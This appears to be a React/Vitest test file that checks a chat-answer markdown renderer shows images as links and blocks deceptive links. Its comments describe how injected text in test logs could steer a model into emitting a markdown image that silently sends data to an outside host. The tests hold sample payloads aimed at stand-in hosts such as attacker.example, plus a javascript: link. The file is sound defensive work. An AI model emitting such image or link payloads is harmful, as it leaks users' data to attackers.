/**
 * An image in a chat answer is shown as a link and never loaded.
 *
 * Chat answers are model output, and the model reads test logs anyone can
 * write. An answer containing `![x](https://host/?q=<data>)` rendered as an
 * <img>, which the browser fetched at once, sending the data in the URL with
 * no click; the CSP's img-src allowed any https: host (OSS review 2026-11-12).
 */
import { describe, expect, it } from 'vitest'
import { render, screen } from '@testing-library/react'
import { MemoryRouter } from 'react-router-dom'

import ChatMarkdown from './ChatMarkdown'

const renderAnswer = (text: string) =>
  render(
    <MemoryRouter>
      <ChatMarkdown text={text} />
    </MemoryRouter>,
  )

describe('ChatMarkdown images', () => {
  it('renders an image as a link, not an <img>', () => {
    const { container } = renderAnswer('Result ![chart](https://example.invalid/collect?q=secret-token)')
    expect(container.querySelector('img')).toBeNull()
    const link = screen.getByTestId('chat-image-link')
    expect(link).toHaveAttribute('href', 'https://example.invalid/collect?q=secret-token')
    expect(link).toHaveAttribute('rel', 'noreferrer noopener')
    expect(link).toHaveTextContent('Image: chart')
  })

  it('names the URL when the image has no alt text', () => {
    const { container } = renderAnswer('![](https://example.invalid/a.png)')
    expect(container.querySelector('img')).toBeNull()
    expect(screen.getByTestId('chat-image-link')).toHaveTextContent('https://example.invalid/a.png')
  })

  it('still renders ordinary links and tables', () => {
    renderAnswer('See [the run](/runs/1).\n\n| a | b |\n|---|---|\n| 1 | 2 |')
    expect(screen.getByRole('link', { name: 'the run' })).toHaveAttribute('href', '/runs/1')
    expect(screen.getByRole('table')).toBeInTheDocument()
  })

  it('shows an image address that is not http(s) as text', () => {
    const { container } = renderAnswer('![chart](//attacker.example/a.png)')
    expect(container.querySelector('a')).toBeNull()
    expect(container).toHaveTextContent('Image: chart')
  })
})

/**
 * A link in a chat answer cannot hide where it goes.
 *
 * The model picks the link text, and text planted in a test log can steer it.
 * `[x](//host/a)` used to pass the "starts with /" test and went to the router
 * as a same-tab link; any other address became a link whose text hid its host
 * (security audit 2026-11-18). Now: one leading "/" is an in-app link, a safe
 * http(s) address is a new-tab link that names its host, anything else is text.
 */
describe('ChatMarkdown links', () => {
  it.each([
    ['protocol-relative', '[x](//attacker.example/a)'],
    ['script', '[x](javascript:alert(1))'],
    ['mail', '[x](mailto:someone@attacker.example)'],
    ['relative', '[x](runs/1)'],
  ])('renders a %s address as plain text, with no anchor', (_name, markdown) => {
    const { container } = renderAnswer(`Open ${markdown} now`)
    expect(container.querySelector('a')).toBeNull()
    expect(container).toHaveTextContent('Open x now')
  })

  it('keeps a backslash address inside the app', () => {
    // A browser reads "/\host" as "//host"; the markdown parser encodes the backslash first.
    renderAnswer('[x](/\\attacker.example/a)')
    const href = screen.getByRole('link').getAttribute('href') ?? ''
    expect(new URL(href, 'https://app.invalid').origin).toBe('https://app.invalid')
  })

  it('opens an https link in a new tab and names its host', () => {
    renderAnswer('[View full report](https://reports.example.invalid/r?d=1)')
    const link = screen.getByRole('link')
    expect(link).toHaveAttribute('href', 'https://reports.example.invalid/r?d=1')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noreferrer noopener')
    expect(link).toHaveTextContent('View full report (reports.example.invalid)')
  })

  it('keeps an in-app path as a router link in the same tab', () => {
    renderAnswer('[run](/runs/123?tab=failures#top) and [home](/overview)')
    const run = screen.getByRole('link', { name: 'run' })
    expect(run).toHaveAttribute('href', '/runs/123?tab=failures#top')
    expect(run).not.toHaveAttribute('target')
    expect(screen.getByRole('link', { name: 'home' })).toHaveAttribute('href', '/overview')
  })
})
